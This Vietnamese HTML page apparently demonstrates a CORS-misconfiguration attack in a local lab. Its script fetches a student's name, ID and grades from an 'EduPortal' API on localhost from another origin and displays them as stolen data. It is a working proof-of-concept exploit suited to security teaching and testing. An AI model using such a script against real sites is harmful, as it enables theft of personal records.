<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Website Kiểm Thử Độc Lập - Test Site External</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f172a;
      color: #f8fafc;
      padding: 40px;
    }
    .container {
      max-width: 650px;
      margin: 0 auto;
      background: #1e293b;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      border: 1px solid #334155;
    }
    h2 { margin-top: 0; color: #38bdf8; font-size: 20px; }
    p { color: #94a3b8; font-size: 14px; }
    .btn {
      background: #0284c7;
      color: white;
      padding: 10px 18px;
      border: none;
      border-radius: 6px;
      font-weight: 600;
      cursor: pointer;
      font-size: 14px;
      margin-top: 15px;
    }
    .btn:hover { background: #0369a1; }
    .result-box {
      margin-top: 20px;
      background: #090d16;
      border: 1px solid #334155;
      border-radius: 8px;
      padding: 18px;
      font-family: Consolas, monospace;
      font-size: 14px;
    }
    .score-item {
      padding: 6px 0;
      border-bottom: 1px solid #1e293b;
      display: flex;
      justify-content: space-between;
    }
    .score-item:last-child { border-bottom: none; }
    .val { color: #4ade80; font-weight: bold; }
  </style>
</head>
<body>

  <div class="container">
    <h2>Kiểm Tra Khai Thác CORS (Cross-Origin Resource Sharing)</h2>
    <p>Trang web độc lập: <strong>http://localhost:4000 (test-site.edu)</strong> đang gọi API lấy trộm dữ liệu từ EduPortal (<strong>http://localhost:3000/api/diem</strong>).</p>

    <button class="btn" onclick="fetchDiem()">Thực hiện gọi API http://localhost:3000/api/diem</button>

    <div class="result-box" id="resultBox">
      <div style="color: #64748b; font-style: italic;">[Chưa có dữ liệu. Vui lòng nhấn nút phía trên để thực hiện gọi API Cross-Origin...]</div>
    </div>
  </div>

  <script>
    async function fetchDiem() {
      const box = document.getElementById('resultBox');
      box.innerHTML = '<div style="color: #38bdf8;">Đang gửi request Cross-Origin đến http://localhost:3000/api/diem...</div>';

      try {
        const host = window.location.hostname || 'localhost';
        const response = await fetch(`http://${host}:3000/api/diem`);
        const data = await response.json();

        let html = `<div style="color: #fbbf24; margin-bottom: 10px; font-weight: bold;">Dữ liệu đọc trộm thành công (CORS Allowed: *):</div>`;
        html += `<div style="font-size: 16px; margin-bottom: 10px; color: #ffffff;">Sinh viên: <strong>${data.sinh_vien}</strong> (MSSV: ${data.mssv})</div>`;
        html += `<div><strong>Bảng điểm chi tiết:</strong></div>`;

        for (const [mon, diem] of Object.entries(data.bang_diem)) {
          html += `<div class="score-item"><span>${mon}:</span> <span class="val">${diem}</span></div>`;
        }

        box.innerHTML = html;
      } catch (err) {
        box.innerHTML = `<div style="color: #ef4444;">Lỗi: ${err.message}</div>`;
      }
    }
  </script>
</body>
</html>
